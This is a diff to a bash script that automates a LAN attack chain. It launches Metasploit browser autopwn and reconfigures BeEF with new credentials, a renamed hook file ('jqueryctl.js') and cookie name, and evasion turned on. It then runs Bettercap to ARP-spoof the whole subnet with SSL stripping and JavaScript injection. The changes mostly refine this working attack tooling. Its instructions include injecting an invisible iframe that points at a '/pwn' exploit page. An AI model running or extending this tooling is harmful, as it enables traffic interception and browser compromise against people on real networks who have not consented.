@@ -54,8 +54,11 @@ if [[ -z "$LAN" ]]; then
   exit 1
 fi
 
+# --- Get LAN Base for arp spoof range ---
+LAN_BASE=$(echo "$LAN" | cut -d '.' -f 1-3)
+
 # --- Kill old processes ---
-pkill -f 'ngrok|ruby'
+pkill -f 'ngrok|ruby' 2>/dev/null
 
 # --- Start Metasploit ---
 color_print GREEN "[*] Starting Metasploit..."
@@ -63,7 +66,12 @@ msfconsole -qx "load msgrpc ServerHost=${LAN} Pass=abc123 SSL=y;use auxiliary/se
 
 # --- Config BeEF ---
 color_print GREEN "[*] Updating BeEF config..."
-if grep -q 'https: false' /usr/share/beef-xss/config.yaml; then
+CONFIG_YAML="/usr/share/beef-xss/config.yaml"
+METASPLOIT_YAML="/usr/share/beef-xss/extensions/metasploit/config.yaml"
+AUTOPWN_YAML="/usr/share/beef-xss/modules/metasploit/browser_autopwn/config.yaml"
+EVASION_YAML="/usr/share/beef-xss/extensions/evasion/config.yaml"
+
+if grep -q 'https: false' "$CONFIG_YAML"; then
   sed -i -e 's|user:   "beef"|user:   "unk9vvn"|g' \
          -e 's|passwd: "beef"|passwd: "00980098"|g' \
          -e 's|# public:|public:|g' \
@@ -72,7 +80,7 @@ if grep -q 'https: false' /usr/share/beef-xss/config.yaml; then
          -e 's|#     https: false|     https: true|g' \
          -e 's|allow_reverse_proxy: false|allow_reverse_proxy: true|g' \
          -e 's|hook.js|jqueryctl.js|g' \
-         -e 's|BEEFHOOK|UNKSESSION|g' /usr/share/beef-xss/config.yaml
+         -e 's|BEEFHOOK|UNKSESSION|g' "$CONFIG_YAML"
 else
   sed -i -e 's|user:   "beef"|user:   "unk9vvn"|g' \
          -e 's|passwd: "beef"|passwd: "00980098"|g' \
@@ -82,15 +90,16 @@ else
          -e 's|https: false|https: true|g' \
          -e 's|allow_reverse_proxy: false|allow_reverse_proxy: true|g' \
          -e 's|hook.js|jqueryctl.js|g' \
-         -e 's|BEEFHOOK|UNKSESSION|g' /usr/share/beef-xss/config.yaml
+         -e 's|BEEFHOOK|UNKSESSION|g' "$CONFIG_YAML"
 fi
 
 sed -i -e 's|enable: false|enable: true|g' \
        -e 's|host: ".*"|host: "'$LAN'"|g' \
        -e 's|callback_host: ".*"|callback_host: "'$LAN'"|g' \
-       -e 's|auto_msfrpcd: false|auto_msfrpcd: true|g' /usr/share/beef-xss/extensions/metasploit/config.yaml
-sed -i -e 's|enable: false|enable: true|g' /usr/share/beef-xss/modules/metasploit/browser_autopwn/config.yaml
-sed -i -e 's|enable: false|enable: true|g' /usr/share/beef-xss/extensions/evasion/config.yaml
+       -e 's|auto_msfrpcd: false|auto_msfrpcd: true|g' "$METASPLOIT_YAML"
+
+sed -i -e 's|enable: false|enable: true|g' "$AUTOPWN_YAML"
+sed -i -e 's|enable: false|enable: true|g' "$EVASION_YAML"
 
 # --- Start BeEF ---
 color_print GREEN "[*] Starting BeEF..."
@@ -103,8 +112,9 @@ color_print GREEN "[*] BeEF PASS: 00980098"
 color_print GREEN "[*] BeEF Panel > Commands > Misc > Create Invisible Iframe > URL: http://$LAN:8080/pwn > Execute"
 color_print GREEN "[*] Running Bettercap with MITM and JS injection..."
 
+# --- Run Bettercap ---
 bettercap -iface "$IFACE" -eval "\
-set arp.spoof.targets $LAN.1-254; \
+set arp.spoof.targets ${LAN_BASE}.1-254; \
 set arp.spoof.internal true; \
 set net.sniff.verbose true; \
 set https.proxy.sslstrip true; \
